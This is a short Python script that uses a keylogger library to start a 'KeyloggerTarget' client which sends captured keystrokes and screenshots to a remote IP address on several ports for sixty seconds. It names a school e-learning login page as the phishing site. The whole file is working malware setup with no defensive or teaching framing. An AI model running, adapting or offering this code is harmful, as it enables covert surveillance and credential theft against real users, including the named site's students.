import KeyloggerScreenshot as ks 

ip = '172.17.77.132'
key_client = ks.KeyloggerTarget(ip, 2387, ip, 4519, ip, 9761, ip, 3572, duration_in_seconds=60, phishing_web="https://elearning.borg1.at/login/index.php") 
key_client.start()